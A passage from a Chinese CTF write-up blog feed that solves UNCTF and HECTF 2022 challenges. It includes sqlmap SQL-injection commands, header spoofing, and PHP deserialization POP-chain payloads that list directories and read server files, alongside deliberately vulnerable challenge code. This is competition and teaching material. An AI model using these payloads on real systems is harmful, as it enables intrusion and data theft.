class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    dic[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    flag += dic[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;welcome_to_misc&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MY-PICTURE"><a href="#MY-PICTURE" class="headerlink" title="MY PICTURE"></a>MY PICTURE</h3><p>将dat文件异或0x8e，解压得到encode.py，内为图片加密算法，逻辑为逐像素RGB值简单异或，还原即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">c = Image.<span class="built_in">open</span>(<span class="string">r&#x27;flag.png&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h = c.size</span><br><span class="line"><span class="built_in">print</span>(l,h)</span><br><span class="line">m = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">      r1,g1,b1 = c.getpixel((i,j))</span><br><span class="line">      r = g1^b1</span><br><span class="line">      g = r1^r</span><br><span class="line">      b = g1^g</span><br><span class="line">      m.putpixel(((i*<span class="number">1200</span>+j)//<span class="number">787</span>,(i*<span class="number">1200</span>+j)%<span class="number">787</span>),(b,g,r))</span><br><span class="line">m.save(<span class="string">r&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">c.close()</span><br><span class="line">m.close()</span><br></pre></td></tr></table></figure><p>还原图片中的flag：<code>UNCTF&#123;93bb442f-2a76-2b6f-c42f-c2297f5fdaf9&#125;</code>。</p><p>​    </p><h3 id="贝斯家族的侵略"><a href="#贝斯家族的侵略" class="headerlink" title="贝斯家族的侵略"></a>贝斯家族的侵略</h3><blockquote><p>提示1：如果明文攻击失败，尝试使用bandzip</p><p>提示2：会动的鼠标</p></blockquote><p>第一层，根据提示1，bandzip压缩后明文攻击，解压；</p><p>第二层，base64隐写，脚本提取隐写内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line"><span class="keyword">if</span> equalnum:</span><br><span class="line">bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure><p>得到的内容16进制转字符串，得到一个文件；</p><p>第三层，根据文件内的提示 <code>Macro.mrf</code>，猜测为鼠标轨迹记录，使用Macro Recorder工具打开，逐条查看轨迹得到flag：<code>flag&#123;b4s3_1s_v3ry_g0od!!&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022 HECTF</title>
    <link href="https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/"/>
    <id>https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/</id>
    <published>2022-11-07T13:38:28.000Z</published>
    <updated>2022-11-28T16:24:14.457Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="迷路的小狮"><a href="#迷路的小狮" class="headerlink" title="迷路的小狮"></a>迷路的小狮</h3><blockquote><p>签到题</p><p>HINTS:</p><p>官网地址需填写完整(建议复制)，无路径即结尾为.cn</p></blockquote><p>进入是迷惑性的404页面，且右键和F12禁用，地址栏手动添加 <code>view-source:</code> 看到源码提示 <code>hectfer</code>。</p><p>访问 <code>/hectfer</code> 提示 <code>hebnu is a good site.</code>，访问 <code>/hebnu</code> 提示 <code>Can you use another way of requesting?</code></p><p>上burpsuite，按提示按步骤修改request header的几处为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /hebnu HTTP/1.1</span><br><span class="line">User-Agent: Internet Explorer</span><br><span class="line">Referer: https://www.hebtu.edu.cn</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>在responce header里看到PHPFuck代码，控制台运行直接得到flag：<code>HECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;</code>。</p><p>​    </p><h3 id="擎天注"><a href="#擎天注" class="headerlink" title="擎天注"></a>擎天注</h3><p>找到GET参数id，用sqlmap可以直接通过时间盲注跑出flag。</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆数据库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名ctf，爆表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名ctf，表名3eDf4f07efC9ee16，爆列名和内容</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf -T 3eDf4f07efC9ee16 --columns --dump</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><blockquote><p>一道神奇的反序列化题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Welcome to HECTF Have fun!!!😊&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line"> <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;难道我真的要失败了，吗&quot;</span>.<span class="variable language_">$this</span>-&gt;str;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;huang-&gt;str;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$eee</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$aaa</span>=<span class="string">&quot;who are you?&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$ccc</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eee-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$css</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;ccc;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ddd</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ext</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;ddd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ddd</span>(<span class="variable">$this</span>-&gt;ext);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$gagaga</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$gagaga</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>); </span><br></pre></td></tr></table></figure></blockquote><p>构造反序列化链：</p><p><code>A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new()</code></p><p>利用内置类 <code>DirectoryIterator</code> + <code>glob://</code>伪协议列目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;DirectoryIterator&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;glob:///*f*&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload:</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 文件名 /ffflllllaaaaaaggggg.txt</span></span><br></pre></td></tr></table></figure><p>再利用内置类 <code>SplFileObject</code> + <code>php://filter</code>伪协议读文件内容： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;SplFileObject&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># HECTF&#123;u_find_m</span></span><br><span class="line"><span class="comment"># y_trulyself&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h3><p>观察页面，有图片上传点，url发现存在文件包含，利用伪协议读源码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FROM_INDEX&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) ? <span class="string">&#x27;home&#x27;</span> : <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_string</span>(<span class="variable">$show</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\./&#x27;</span>, <span class="variable">$show</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/zip/i&#x27;</span>,<span class="variable">$show</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Not this !!!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&#x27;ob_gzhandler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_tshow</span>(<span class="params"><span class="variable">$show</span></span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;header&quot;</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;a href=<span class="string">&quot;?show=home&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">images</span>/<span class="title">logo</span>.<span class="title">jpg</span>&quot; <span class="title">alt</span>=&quot;&quot;&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">fatal</span>($<span class="title">msg</span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h2</span>&gt;<span class="title">Error</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">msg</span>;?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">exit</span>(1);</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">page_tshow</span>($<span class="title">show</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!(<span class="title">include</span> $<span class="title">show</span> . &#x27;.<span class="title">php</span>&#x27;))</span></span><br><span class="line"><span class="class">    <span class="title">fatal</span>(&#x27;<span class="title">no</span> <span class="title">no</span> <span class="title">no</span>&#x27;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span 